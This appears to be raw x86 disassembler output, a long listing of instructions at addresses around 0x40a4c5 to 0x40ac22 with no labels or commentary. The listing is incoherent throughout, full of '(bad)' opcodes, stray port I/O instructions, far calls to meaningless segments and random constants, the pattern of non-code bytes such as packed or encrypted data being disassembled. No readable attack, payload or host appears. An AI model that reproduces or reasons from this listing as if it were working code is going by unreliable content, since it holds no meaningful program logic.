  40a4c5:	jge    0x40a4bb
  40a4c7:	push   ebx
  40a4c8:	lods   al,BYTE PTR ds:[esi]
  40a4c9:	loope  0x40a4f6
  40a4cb:	or     DWORD PTR [ebp+esi*8-0x73900584],eax
  40a4d2:	in     al,0xb2
  40a4d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4d5:	daa    
  40a4d6:	push   esp
  40a4d7:	in     eax,dx
  40a4d8:	pop    esi
  40a4d9:	test   al,0xb
  40a4db:	or     bl,BYTE PTR ds:0xd36949a4
  40a4e1:	mov    DWORD PTR [esi-0x41bc556d],edx
  40a4e7:	xor    al,0x6f
  40a4e9:	add    DWORD PTR [esi],ebx
  40a4eb:	in     eax,0x3d
  40a4ed:	mov    dl,0x12
  40a4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4f0:	inc    esp
  40a4f1:	pop    eax
  40a4f2:	mov    cl,0x1f
  40a4f4:	(bad)  
  40a4f5:	adc    BYTE PTR [esi-0x6f806999],dl
  40a4fb:	add    eax,0x63dba3c9
  40a500:	pushf  
  40a501:	mov    al,0xc0
  40a503:	push   ebx
  40a504:	out    dx,al
  40a505:	pop    ds
  40a506:	sbb    DWORD PTR [edi+eiz*1+0x287e8117],esi
  40a50d:	stos   DWORD PTR es:[di],eax
  40a50f:	and    BYTE PTR [eax+ebp*1],al
  40a512:	xchg   edi,eax
  40a513:	xchg   BYTE PTR [ecx],dl
  40a515:	or     ebp,DWORD PTR [eax]
  40a517:	inc    edi
  40a518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a519:	push   ebx
  40a51a:	sbb    BYTE PTR [ecx],ah
  40a51c:	sbb    eax,0x464d914f
  40a521:	loop   0x40a578
  40a523:	arpl   WORD PTR [edi],ax
  40a525:	cmc    
  40a526:	loopne 0x40a58f
  40a528:	jg     0x40a4e2
  40a52a:	or     edi,DWORD PTR [ebx]
  40a52c:	pusha  
  40a52d:	push   0xfffffffb
  40a52f:	repz (bad) 
  40a531:	es mov esp,0x94806e03
  40a537:	data16 jb 0x40a587
  40a53a:	bound  ebx,QWORD PTR ds:0xac448126
  40a540:	test   DWORD PTR [ebx],edi
  40a542:	in     al,0x26
  40a544:	xor    DWORD PTR [esi-0x6783d757],edi
  40a54a:	add    al,dl
  40a54c:	cmc    
  40a54d:	push   cs
  40a54e:	lods   al,BYTE PTR ds:[esi]
  40a54f:	pop    es
  40a550:	pop    edx
  40a551:	jb     0x40a5aa
  40a553:	fwait
  40a554:	push   ecx
  40a555:	mov    ah,0xf2
  40a557:	push   cs
  40a558:	add    ebp,DWORD PTR [ecx-0x52]
  40a55b:	out    0xf6,eax
  40a55d:	adc    ah,cl
  40a55f:	xlat   BYTE PTR ds:[ebx]
  40a560:	cmc    
  40a561:	sar    BYTE PTR ds:0x71ca3fe8,1
  40a567:	call   0x84f9:0x52af12bf
  40a56e:	test   BYTE PTR [eax],bl
  40a570:	jae    0x40a592
  40a572:	(bad)  
  40a573:	imul   esp
  40a575:	mov    dh,0xc2
  40a577:	push   es
  40a578:	arpl   cx,ax
  40a57a:	shl    BYTE PTR [eax],cl
  40a57c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a57d:	out    dx,al
  40a57e:	pop    ds
  40a57f:	jae    0x40a5e5
  40a581:	mov    ebx,0x7e2a1119
  40a586:	pusha  
  40a587:	mov    DWORD PTR [edx],esi
  40a589:	push   ds
  40a58a:	and    eax,0x66108e73
  40a58f:	sub    edi,ebx
  40a591:	adc    DWORD PTR [esi+0x18],edx
  40a594:	pop    ds
  40a595:	xchg   ebp,eax
  40a596:	push   ss
  40a597:	mov    dh,0x17
  40a599:	imul   eax,DWORD PTR es:[ebx+0x7d],0x8ebe0444
  40a5a1:	(bad)  
  40a5a2:	jp     0x40a5eb
  40a5a4:	std    
  40a5a5:	push   ebp
  40a5a6:	or     DWORD PTR [ebx+0x1dedefd1],ecx
  40a5ac:	ins    DWORD PTR es:[edi],dx
  40a5ad:	pop    es
  40a5ae:	adc    ecx,0x8
  40a5b1:	inc    eax
  40a5b2:	dec    eax
  40a5b3:	mov    esi,0x81088713
  40a5b8:	popa   
  40a5b9:	test   BYTE PTR [bp+si],0xb0
  40a5bd:	cmp    ecx,edx
  40a5bf:	enter  0xb734,0xf1
  40a5c3:	test   DWORD PTR [edi+0x4d],ecx
  40a5c6:	mov    ebp,0xbbfea99c
  40a5cb:	and    dl,BYTE PTR [edi+0x12]
  40a5ce:	add    ecx,DWORD PTR [eax]
  40a5d0:	in     eax,0xa4
  40a5d2:	ins    BYTE PTR es:[edi],dx
  40a5d3:	inc    esi
  40a5d4:	daa    
  40a5d5:	sbb    ah,BYTE PTR [ecx]
  40a5d7:	sbb    BYTE PTR [edx+0x5f],cl
  40a5da:	in     eax,0xc
  40a5dc:	cdq    
  40a5dd:	jmp    0xcc7c:0xa73137e8
  40a5e4:	int3   
  40a5e5:	js     0x40a592
  40a5e7:	aas    
  40a5e8:	jae    0x40a626
  40a5ea:	std    
  40a5eb:	fmul   st,st(0)
  40a5ed:	dec    esi
  40a5ee:	arpl   WORD PTR [ecx+0x67],bp
  40a5f1:	loopne 0x40a5b7
  40a5f3:	push   ecx
  40a5f4:	xor    al,0xc4
  40a5f6:	aam    0x7b
  40a5f8:	arpl   WORD PTR [ebp-0x48aa180b],di
  40a5fe:	(bad)  
  40a5ff:	mov    esp,0x50d31f30
  40a604:	loopne 0x40a5e7
  40a606:	adc    DWORD PTR [ebp+edi*2-0x3b],edx
  40a60a:	retf   
  40a60b:	fstp   TBYTE PTR [eax]
  40a60d:	mul    DWORD PTR [esi+ebx*1-0x71]
  40a611:	popa   
  40a612:	(bad)  
  40a613:	adc    bl,ah
  40a615:	jle    0x40a627
  40a617:	rcr    DWORD PTR ds:0x692aecd1,0x62
  40a61e:	sbb    BYTE PTR [ecx*2-0x36dd1c31],bl
  40a625:	mov    al,ds:0x9ce6b1c5
  40a62a:	fstp   DWORD PTR [eax+0x7a]
  40a62d:	mov    ch,BYTE PTR [edx+0x71]
  40a630:	ret    0xf253
  40a633:	mov    bl,0x1f
  40a635:	cdq    
  40a636:	int3   
  40a637:	bound  edx,QWORD PTR [ecx]
  40a639:	in     al,dx
  40a63a:	and    BYTE PTR ds:0x4cdfd529,al
  40a640:	xchg   edx,eax
  40a641:	sbb    al,0xb3
  40a643:	push   ss
  40a644:	cwde   
  40a645:	cmp    ebp,DWORD PTR [esi]
  40a647:	mov    edx,0xb1986920
  40a64c:	pop    ecx
  40a64d:	in     eax,0x23
  40a64f:	cmp    al,BYTE PTR [eax+0x69]
  40a652:	cli    
  40a653:	cmp    esi,DWORD PTR [ebp+0xa6097b3]
  40a659:	mov    cl,0xbd
  40a65b:	bound  esi,QWORD PTR [ecx+0x12d0706a]
  40a661:	push   ebx
  40a662:	jb     0x40a5f8
  40a664:	or     DWORD PTR [edi-0x3e],esp
  40a667:	mov    ds:0x51db110,al
  40a66c:	sub    DWORD PTR [ebx-0x26],ebx
  40a66f:	dec    ecx
  40a670:	shr    DWORD PTR [edx-0x32],1
  40a673:	push   0xffffff99
  40a675:	inc    esp
  40a676:	(bad)  
  40a677:	loopne 0x40a676
  40a679:	or     eax,0x42923192
  40a67e:	inc    esi
  40a67f:	push   es
  40a680:	jno    0x40a665
  40a682:	mov    bl,0x70
  40a684:	sahf   
  40a685:	pushf  
  40a686:	mov    dl,BYTE PTR [edi-0x1aae23b3]
  40a68c:	jae    0x40a661
  40a68e:	cmp    eax,0x5fadafa6
  40a693:	lock mov ebp,0x7e24a0b7
  40a699:	push   eax
  40a69a:	call   0xba5:0x818b5742
  40a6a1:	mov    dl,ah
  40a6a3:	enter  0x5d4f,0x57
  40a6a7:	ds jo  0x40a672
  40a6aa:	test   eax,0xae249706
  40a6af:	xchg   ebp,eax
  40a6b0:	sub    dh,al
  40a6b2:	(bad)  
  40a6b3:	cmp    esp,DWORD PTR [eax]
  40a6b5:	call   0x823d9678
  40a6ba:	sub    edx,0xa32f21f7
  40a6c0:	jns    0x40a6e8
  40a6c2:	mov    ch,0x66
  40a6c4:	inc    esi
  40a6c5:	mov    bh,0x1
  40a6c7:	cs out dx,eax
  40a6c9:	inc    ecx
  40a6ca:	sbb    esp,DWORD PTR [ebp-0x7debc163]
  40a6d0:	pop    ss
  40a6d1:	ins    DWORD PTR es:[edi],dx
  40a6d2:	mov    bl,0x27
  40a6d4:	push   esi
  40a6d5:	mov    bh,BYTE PTR [esi+0x762c271c]
  40a6db:	jmp    0xfdd6:0xcb80541e
  40a6e2:	shl    DWORD PTR [esi-0x3f6cc898],1
  40a6e8:	cmc    
  40a6e9:	imul   ebp,DWORD PTR [ebp-0x4],0x3f
  40a6ed:	pop    DWORD PTR [edi+0x34]
  40a6f0:	pop    edi
  40a6f1:	mov    ebx,0xe1e0f2a6
  40a6f6:	call   0xf1fc:0xdb612094
  40a6fd:	pop    es
  40a6fe:	mov    WORD PTR [ebx+0x24],?
  40a701:	test   ecx,esp
  40a703:	mov    dl,bl
  40a705:	jns    0x40a6e1
  40a707:	mov    ds:0xe1963e55,al
  40a70c:	mov    ecx,0x10912717
  40a711:	mov    WORD PTR [eax-0x55ee58b5],?
  40a717:	popa   
  40a718:	push   ecx
  40a719:	mov    ds:0xda28bac6,al
  40a71e:	(bad)
  40a722:	fsubr  DWORD PTR [eax+0x52]
  40a725:	cwde   
  40a726:	adc    al,0xd
  40a728:	and    edx,ebx
  40a72a:	xchg   ebx,eax
  40a72b:	in     al,dx
  40a72c:	call   0x3b9c:0x4555f085
  40a733:	inc    ecx
  40a734:	inc    esp
  40a735:	pop    ebx
  40a736:	(bad)  
  40a737:	rcr    BYTE PTR [esi],cl
  40a739:	in     al,dx
  40a73a:	(bad)  
  40a73c:	call   0x463b:0x2d22749e
  40a743:	sbb    DWORD PTR [esi-0x1b8d8668],edi
  40a749:	(bad)  
  40a74a:	jb     0x40a7bd
  40a74c:	retf   
  40a74d:	and    bh,dh
  40a74f:	das    
  40a750:	repnz push ds
  40a752:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40a754:	push   0x39cf3135
  40a759:	cmp    edi,DWORD PTR [ebx+0x65]
  40a75c:	loopne 0x40a6f9
  40a75e:	jl     0x40a7c2
  40a760:	pop    edi
  40a761:	and    DWORD PTR [esp+edx*8],esp
  40a764:	cmp    al,0x3b
  40a766:	mov    ds:0xc68a6a0b,al
  40a76b:	xor    bl,bh
  40a76d:	(bad)  
  40a76e:	mov    edx,esp
  40a770:	dec    eax
  40a771:	push   0x66
  40a773:	pop    es
  40a774:	adc    DWORD PTR [esi],esp
  40a776:	out    dx,al
  40a777:	mov    BYTE PTR [edx],bl
  40a779:	outs   dx,BYTE PTR ds:[esi]
  40a77a:	cmp    eax,0xe04a39b7
  40a77f:	out    dx,al
  40a780:	or     DWORD PTR [ecx-0x6c],esp
  40a783:	push   esp
  40a784:	repz shl BYTE PTR [esi+0x69],cl
  40a788:	jnp    0x40a718
  40a78a:	dec    ebx
  40a78b:	dec    ebx
  40a78c:	pop    ecx
  40a78d:	test   eax,0x55731711
  40a792:	push   ss
  40a793:	adc    BYTE PTR [ebp-0x7f585dd0],bl
  40a799:	xor    BYTE PTR [eax-0x15],ah
  40a79c:	adc    al,0xdc
  40a79e:	stos   DWORD PTR es:[edi],eax
  40a79f:	dec    ecx
  40a7a0:	cmc    
  40a7a1:	mov    DWORD PTR [ebp+0x37],ebp
  40a7a4:	stc    
  40a7a5:	push   es
  40a7a6:	imul   edi,DWORD PTR [esi+esi*4-0x638e4cac],0xffffffae
  40a7ae:	imul   DWORD PTR [esi+eax*4-0x18fab8d8]
  40a7b5:	into   
  40a7b6:	jecxz  0x40a81b
  40a7b8:	add    ch,BYTE PTR [eax]
  40a7ba:	(bad)  
  40a7bb:	push   0xa
  40a7bd:	outs   dx,BYTE PTR ds:[esi]
  40a7be:	add    al,bh
  40a7c0:	adc    ebp,eax
  40a7c2:	aad    0x95
  40a7c4:	dec    BYTE PTR [esi+ebp*2+0x31]
  40a7c8:	xchg   edx,eax
  40a7c9:	stos   DWORD PTR es:[edi],eax
  40a7ca:	cmp    esp,DWORD PTR [ecx-0x54]
  40a7cd:	ins    BYTE PTR es:[edi],dx
  40a7ce:	es pop ebp
  40a7d0:	xor    al,cl
  40a7d2:	add    esi,DWORD PTR [ebx+0x62]
  40a7d5:	aaa    
  40a7d6:	mov    dh,0xe6
  40a7d8:	retf   0xae28
  40a7db:	ret    
  40a7dc:	mov    bh,0x17
  40a7de:	xchg   DWORD PTR [esi],ebx
  40a7e0:	jl     0x40a7bb
  40a7e2:	nop
  40a7e3:	repz popw ds
  40a7e6:	xchg   edx,eax
  40a7e7:	lods   al,BYTE PTR ds:[esi]
  40a7e8:	retf   
  40a7e9:	lods   eax,DWORD PTR ds:[esi]
  40a7ea:	or     dh,BYTE PTR [eax+0x53826b28]
  40a7f0:	and    al,BYTE PTR ds:[edx+0x57]
  40a7f4:	popf   
  40a7f5:	jnp    0x40a857
  40a7f7:	fistp  QWORD PTR [ebp+0x6e]
  40a7fa:	push   0xffffff88
  40a7fc:	dec    BYTE PTR [edx-0x4ce1ac7d]
  40a802:	(bad)  
  40a803:	pop    eax
  40a804:	dec    eax
  40a805:	addr16 jmp 0xcf14:0x3e92a15e
  40a80d:	dec    esp
  40a80e:	add    al,0x77
  40a810:	mov    eax,0x59794950
  40a815:	xchg   esp,eax
  40a816:	test   DWORD PTR [esi-0x16],edx
  40a819:	pop    esi
  40a81a:	fwait
  40a81b:	aas    
  40a81c:	leave  
  40a81d:	cmovp  esp,DWORD PTR [ebx]
  40a820:	sub    al,0xbe
  40a822:	dec    ebx
  40a823:	inc    edi
  40a824:	xchg   ecx,eax
  40a825:	arpl   WORD PTR [edi-0xf],bx
  40a828:	cwde   
  40a829:	mov    al,ds:0xecc85265
  40a82e:	inc    edi
  40a82f:	jge    0x40a88d
  40a831:	xchg   esp,eax
  40a832:	retf   
  40a833:	data16 cmp BYTE PTR [ecx+0x4d],bh
  40a837:	jecxz  0x40a7da
  40a839:	xor    bl,dh
  40a83b:	shl    BYTE PTR [eax-0x3d5d1825],1
  40a841:	ret    0x825f
  40a844:	gs lahf 
  40a846:	mov    dh,0x96
  40a848:	nop
  40a849:	mov    dh,0x95
  40a84b:	mov    dl,0x62
  40a84d:	das    
  40a84e:	or     dh,bl
  40a850:	mov    eax,ds:0x7d6b9778
  40a855:	pop    ecx
  40a856:	xlat   BYTE PTR ds:[ebx]
  40a857:	ss int3 
  40a859:	dec    ebx
  40a85a:	sbb    BYTE PTR [eax],al
  40a85c:	xchg   BYTE PTR [ebp-0x117b8af1],bl
  40a862:	imul   ebp,DWORD PTR [ebx+ecx*2-0x6e],0xad6f4252
  40a86a:	(bad)  
  40a86d:	pop    es
  40a86e:	or     edi,DWORD PTR [edi+eax*2+0x54]
  40a872:	jne    0x40a893
  40a874:	jmp    0x40a869
  40a876:	repnz cwde 
  40a878:	cmp    DWORD PTR [edi-0x22],edi
  40a87b:	adc    DWORD PTR [esi+0x54],edx
  40a87e:	stos   DWORD PTR es:[edi],eax
  40a87f:	sub    ecx,DWORD PTR [edx+0x76]
  40a882:	sub    edi,DWORD PTR [eax+0x50]
  40a885:	das    
  40a886:	add    al,0x9
  40a888:	inc    eax
  40a889:	xor    eax,DWORD PTR [ebx-0xc]
  40a88c:	mov    esp,DWORD PTR [edi-0x15]
  40a88f:	and    ebx,DWORD PTR ds:[eax+0x11]
  40a893:	imul   eax,DWORD PTR [edx],0x9f9b9702
  40a899:	and    eax,DWORD PTR [ebp-0x1bae205e]
  40a89f:	mov    edx,esi
  40a8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a2:	lods   eax,DWORD PTR ds:[esi]
  40a8a3:	fucomip st,st(2)
  40a8a5:	iret   
  40a8a6:	xor    BYTE PTR [ebx],0xc5
  40a8a9:	dec    ebx
  40a8aa:	mov    esp,0x4cd98f48
  40a8af:	mov    dh,dl
  40a8b1:	lds    ecx,FWORD PTR [eax+ebx*1]
  40a8b4:	shr    BYTE PTR [ebx-0x6d],1
  40a8b7:	sub    BYTE PTR [ebp+0x32885922],dl
  40a8bd:	test   edi,ebx
  40a8bf:	mov    ebx,0x11aa97dc
  40a8c4:	cwde   
  40a8c5:	push   0x582add7
  40a8ca:	add    BYTE PTR [eax+0x1a],ah
  40a8cd:	fld    DWORD PTR [esi]
  40a8cf:	es enter 0x503,0x35
  40a8d4:	or     DWORD PTR [esi],eax
  40a8d6:	mov    ah,0x37
  40a8d8:	pop    ss
  40a8d9:	sbb    dl,BYTE PTR [edi+ebx*2+0x55]
  40a8dd:	icebp  
  40a8de:	(bad)  
  40a8e0:	mov    bl,0x75
  40a8e2:	rcr    DWORD PTR [edi],0x14
  40a8e5:	ss stc 
  40a8e7:	imul   ebx,DWORD PTR [ebx+0x75cc4451],0x9
  40a8ee:	sahf   
  40a8ef:	scas   al,BYTE PTR es:[edi]
  40a8f0:	jae    0x40a951
  40a8f2:	and    edx,ebx
  40a8f4:	inc    esi
  40a8f5:	dec    edi
  40a8f6:	xchg   ebp,eax
  40a8f7:	cmp    al,0x58
  40a8f9:	or     cl,dl
  40a8fb:	inc    esp
  40a8fc:	push   ebx
  40a8fd:	xchg   ebx,eax
  40a8fe:	mov    bl,0x73
  40a900:	dec    ecx
  40a901:	inc    ebx
  40a902:	inc    ecx
  40a903:	and    al,BYTE PTR ds:0xa46c49f6
  40a909:	push   ebp
  40a90a:	xor    ch,BYTE PTR [ecx-0x73]
  40a90d:	mul    DWORD PTR [ebp+ebp*4-0x18]
  40a911:	xchg   ebx,eax
  40a912:	xor    eax,0xe705097f
  40a917:	fs cdq 
  40a919:	pop    es
  40a91a:	leave  
  40a91b:	sub    edx,DWORD PTR [esi+0x134fe711]
  40a921:	sbb    DWORD PTR [ebp-0x2a52a52b],0xa3e472f1
  40a92b:	popf   
  40a92c:	(bad)  
  40a92d:	push   ss
  40a92e:	mov    ecx,0x9d81bf4c
  40a933:	imul   ebp,edi,0x40bb38c4
  40a939:	jge    0x40a992
  40a93b:	pop    ebp
  40a93c:	mov    edi,0xacc4dce6
  40a941:	jbe    0x40a970
  40a943:	ja     0x40a97f
  40a945:	jmp    0x40a917
  40a947:	cmp    ecx,ecx
  40a949:	faddp  st(3),st
  40a94b:	call   0xa9162391
  40a950:	call   0x16b5e5f4
  40a955:	jne    0x40a90c
  40a957:	sub    DWORD PTR [ecx+0x39],esi
  40a95a:	xchg   esi,eax
  40a95b:	push   ebp
  40a95c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a95e:	push   ebx
  40a95f:	out    dx,al
  40a960:	jb     0x40a919
  40a962:	or     DWORD PTR [edx+0x61e7c398],esi
  40a968:	inc    eax
  40a969:	adc    BYTE PTR ds:0xe754caad,bl
  40a96f:	dec    edi
  40a970:	imul   ebp,DWORD PTR [ebp+0x44],0xda07aff7
  40a977:	cld    
  40a978:	fisub  WORD PTR [ebx+0x73dfa9ab]
  40a97e:	imul   ecx,DWORD PTR [edx],0x1b
  40a981:	or     bl,dl
  40a983:	(bad)  
  40a984:	stos   BYTE PTR es:[edi],al
  40a985:	push   ss
  40a986:	jae    0x40a9f7
  40a988:	call   0x5095:0x5632b101
  40a98f:	popa   
  40a990:	je     0x40a9a1
  40a992:	push   ss
  40a993:	ficomp WORD PTR [ecx-0x457fe01f]
  40a999:	mov    bh,0x44
  40a99b:	nop
  40a99c:	aam    0x49
  40a99e:	popf   
  40a99f:	je     0x40a93d
  40a9a1:	cmp    ebp,DWORD PTR [ebx]
  40a9a3:	(bad)  
  40a9a4:	add    al,0xf5
  40a9a6:	inc    edx
  40a9a7:	push   ss
  40a9a8:	out    dx,eax
  40a9a9:	xchg   esi,eax
  40a9aa:	mov    ah,0x3a
  40a9ac:	mov    bh,0x47
  40a9ae:	icebp  
  40a9af:	enter  0xe242,0xe4
  40a9b3:	jg     0x40a963
  40a9b5:	ret    
  40a9b6:	leave  
  40a9b7:	add    al,0xc0
  40a9b9:	ss jecxz 0x40a9cc
  40a9bc:	dec    ecx
  40a9bd:	ret    
  40a9be:	sub    eax,0xea262c05
  40a9c3:	jmp    0x40a9a4
  40a9c5:	cmp    BYTE PTR [ecx],ch
  40a9c7:	out    dx,eax
  40a9c8:	jno    0x40aa34
  40a9ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9cb:	aas    
  40a9cc:	ror    dh,cl
  40a9ce:	or     eax,0x11975f5c
  40a9d3:	jo     0x40a9f7
  40a9d5:	xchg   esp,eax
  40a9d6:	push   ds
  40a9d7:	adc    al,0x3a
  40a9d9:	fidiv  DWORD PTR [eax-0x6e]
  40a9dc:	sub    BYTE PTR [edx+ebp*4],al
  40a9df:	cmp    al,0x32
  40a9e1:	outs   dx,DWORD PTR ds:[esi]
  40a9e2:	mov    eax,ds:0x33c0d55
  40a9e7:	mov    eax,ds:0xbeaa2f8c
  40a9ec:	and    dh,cl
  40a9ee:	cmp    al,BYTE PTR [edi]
  40a9f0:	mov    ds:0xab5e6c95,eax
  40a9f5:	xor    DWORD PTR [eax+0x13],esp
  40a9f8:	and    al,BYTE PTR [esi]
  40a9fa:	(bad)  
  40a9fb:	retf   0xa09
  40a9fe:	inc    ecx
  40a9ff:	cmp    edx,DWORD PTR ss:[esi+0x3c]
  40aa03:	xor    dl,BYTE PTR [edx-0x2ccef230]
  40aa09:	nop
  40aa0a:	out    0x52,eax
  40aa0c:	int    0x65
  40aa0e:	mov    bl,0xeb
  40aa10:	xor    dh,bl
  40aa12:	aas    
  40aa13:	adc    eax,0x90afc7d
  40aa18:	mov    dh,0xb8
  40aa1a:	je     0x40aa0f
  40aa1c:	ds (bad) 
  40aa1e:	push   0xffffffc6
  40aa20:	ret    
  40aa21:	popf   
  40aa22:	bound  esp,QWORD PTR [esi-0xa]
  40aa25:	mov    ebp,0x84d96a97
  40aa2a:	xlat   BYTE PTR ds:[ebx]
  40aa2b:	je     0x40a9e8
  40aa2d:	xchg   esp,eax
  40aa2e:	shr    ebx,cl
  40aa30:	in     eax,dx
  40aa31:	jo     0x40a9ce
  40aa33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa34:	dec    esi
  40aa35:	cmc    
  40aa36:	dec    eax
  40aa37:	mov    ds:0xf0024d4,al
  40aa3c:	fs call 0xec55:0x479ca9d7
  40aa44:	cs retf 0xe82e
  40aa48:	push   eax
  40aa49:	or     eax,0x767898d0
  40aa4e:	mov    cl,BYTE PTR [esi-0x733fdb5f]
  40aa54:	in     al,dx
  40aa55:	inc    eax
  40aa56:	lock dec edx
  40aa58:	lahf   
  40aa59:	ror    DWORD PTR [esi-0x5b],cl
  40aa5c:	mov    al,ds:0xa83ab9c0
  40aa61:	mov    ds:0x56d07859,eax
  40aa66:	add    bh,dh
  40aa68:	fwait
  40aa69:	aam    0x3b
  40aa6b:	das    
  40aa6c:	mov    ds:0xd3eb8710,eax
  40aa71:	push   0xf12ebd87
  40aa76:	lahf   
  40aa77:	adc    bl,BYTE PTR [esi]
  40aa79:	lods   al,BYTE PTR ds:[esi]
  40aa7a:	rol    DWORD PTR ds:0x21aa1882,1
  40aa80:	cdq    
  40aa81:	and    al,0x39
  40aa83:	mov    eax,ds:0xcf2c57b8
  40aa88:	cs data16 add al,0x18
  40aa8c:	mov    esi,0x9b998145
  40aa91:	mov    edx,0xbc00b91a
  40aa96:	or     eax,DWORD PTR [edi-0x5b]
  40aa99:	cmp    DWORD PTR [edx],0xfffffff4
  40aa9c:	mov    ecx,0x6e85638b
  40aaa1:	dec    eax
  40aaa2:	cdq    
  40aaa3:	test   BYTE PTR ds:0xc67a7f6e,ch
  40aaa9:	stc    
  40aaaa:	adc    DWORD PTR [esi-0x2b3ffa81],0x3a88c24
  40aab4:	addr16 mov ebx,0x936ead60
  40aaba:	in     al,0x75
  40aabc:	aas    
  40aabd:	add    eax,0xfb35dc63
  40aac2:	adc    eax,0xb9204775
  40aac7:	scas   al,BYTE PTR es:[edi]
  40aac8:	imul   BYTE PTR [edi]
  40aaca:	ret    
  40aacb:	dec    esi
  40aacc:	dec    esp
  40aacd:	cwde   
  40aace:	aad    0xc8
  40aad0:	mov    eax,0x59741010
  40aad5:	and    al,0x25
  40aad7:	pop    edi
  40aad8:	pop    ebp
  40aad9:	push   esp
  40aada:	imul   edx,ecx,0x66
  40aadd:	scas   eax,DWORD PTR es:[edi]
  40aade:	add    al,cl
  40aae0:	inc    esi
  40aae1:	sbb    esp,0x9a8563d6
  40aae7:	enter  0xf4f2,0xa8
  40aaeb:	lods   al,BYTE PTR ds:[esi]
  40aaec:	dec    eax
  40aaed:	jp     0x40ab41
  40aaef:	gs lock sub al,0xd7
  40aaf3:	ffree  st(4)
  40aaf5:	mov    al,0x34
  40aaf7:	call   0x1da27d79
  40aafc:	test   DWORD PTR [ecx+esi*2],0x23751279
  40ab03:	in     eax,dx
  40ab04:	xor    al,0x95
  40ab06:	jg     0x3268f471
  40ab0c:	push   ss
  40ab0d:	mov    eax,0x3dc00aea
  40ab12:	(bad)  [esp+edx*2+0x7cc288c7]
  40ab19:	dec    esp
  40ab1a:	aaa    
  40ab1b:	ja     0x40ab3b
  40ab1d:	jns    0x40aaa7
  40ab1f:	ins    DWORD PTR es:[edi],dx
  40ab20:	fist   WORD PTR [edx+0xa00d16e]
  40ab26:	je     0x40ab27
  40ab28:	push   ebx
  40ab29:	loope  0x40ab8b
  40ab2b:	in     al,dx
  40ab2c:	push   es
  40ab2d:	jge    0x40aadc
  40ab2f:	jl     0x40aacc
  40ab31:	sub    al,0xca
  40ab33:	mov    BYTE PTR [ecx-0x48dda1d0],dh
  40ab39:	add    BYTE PTR [ecx+esi*2],ah
  40ab3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab3d:	or     eax,0x6e3e7a53
  40ab42:	sbb    dh,dl
  40ab44:	cmp    ebx,DWORD PTR [eax]
  40ab46:	push   es
  40ab47:	xlat   BYTE PTR ds:[ebx]
  40ab48:	add    ebx,DWORD PTR [eax]
  40ab4a:	neg    BYTE PTR [ebx+0x65]
  40ab4d:	jns    0x40ab7a
  40ab4f:	jmp    0x5f609c77
  40ab54:	sbb    eax,0x20e6b920
  40ab59:	xchg   ebx,eax
  40ab5a:	add    al,0x70
  40ab5c:	ins    BYTE PTR es:[edi],dx
  40ab5d:	jge    0x40abdb
  40ab5f:	mov    ?,WORD PTR ds:0x4be8c873
  40ab65:	mov    ah,0x4c
  40ab67:	loopne 0x40ab28
  40ab69:	add    DWORD PTR ds:0xaa17b78b,ebx
  40ab6f:	int    0x95
  40ab71:	xchg   esp,eax
  40ab72:	cmc    
  40ab73:	rcl    DWORD PTR [ebx+0x629a698f],1
  40ab79:	jg     0x40abac
  40ab7b:	ins    DWORD PTR es:[edi],dx
  40ab7c:	(bad)  
  40ab7d:	mov    dh,BYTE PTR [ebp-0x74]
  40ab80:	mov    cl,0xc9
  40ab82:	and    al,BYTE PTR [ebx+0x18346f39]
  40ab88:	ss xor eax,edi
  40ab8b:	and    eax,0xb89f1d18
  40ab90:	jle    0x40ab42
  40ab92:	mov    al,BYTE PTR [ebp+0x5408c17]
  40ab98:	pop    edx
  40ab99:	std    
  40ab9a:	sbb    bl,BYTE PTR ds:0xce11ef1b
  40aba0:	jns    0x40abec
  40aba2:	mov    ebp,0x304689bc
  40aba7:	dec    ebx
  40aba8:	xor    esp,DWORD PTR [edx-0x41]
  40abab:	test   DWORD PTR [ebp-0x68],ecx
  40abae:	mov    edx,0x26b8e21e
  40abb3:	mov    dh,0x65
  40abb5:	push   edi
  40abb6:	push   ebp
  40abb7:	repnz fs stos BYTE PTR es:[edi],al
  40abba:	or     DWORD PTR [eax-0x443fb963],0x7b99afed
  40abc4:	iret   
  40abc5:	mov    ah,0xa2
  40abc7:	mov    edi,DWORD PTR [eax-0x7c]
  40abca:	ja     0x40abb8
  40abcc:	mov    ah,0x6d
  40abce:	cdq    
  40abcf:	dec    esp
  40abd0:	xlat   BYTE PTR ds:[ebx]
  40abd1:	test   esp,ecx
  40abd3:	ins    BYTE PTR es:[edi],dx
  40abd4:	std    
  40abd5:	cmp    DWORD PTR [ebp+0x26],ebp
  40abd8:	inc    ecx
  40abd9:	pop    esp
  40abda:	(bad)  
  40abdb:	cli    
  40abdc:	ins    BYTE PTR es:[edi],dx
  40abdd:	pop    ebp
  40abde:	adc    dh,bl
  40abe0:	and    BYTE PTR [ecx+0x71],cl
  40abe3:	pop    eax
  40abe4:	call   0x25b271f
  40abe9:	inc    ecx
  40abea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abeb:	jbe    0x40abf5
  40abed:	in     eax,0x40
  40abef:	and    DWORD PTR [edi-0x66],esi
  40abf2:	sbb    al,BYTE PTR [ebx+0x14546ecc]
  40abf8:	push   ecx
  40abf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abfa:	or     al,0x42
  40abfc:	jo     0x40ac39
  40abfe:	adc    al,0xcf
  40ac00:	lds    eax,FWORD PTR [edi-0x5f]
  40ac03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac04:	dec    edx
  40ac05:	push   0x79
  40ac07:	and    al,0x39
  40ac09:	jl     0x40abf0
  40ac0b:	dec    eax
  40ac0c:	xor    eax,0xc8c76fe4
  40ac11:	xlat   BYTE PTR ds:[ebx]
  40ac12:	jb     0x40ac8d
  40ac14:	adc    eax,0x91603d88
  40ac19:	push   ebp
  40ac1a:	sub    ah,BYTE PTR [eax+0x1cb903db]
  40ac20:	js     0x40abe4
  40ac22:	dec    esi
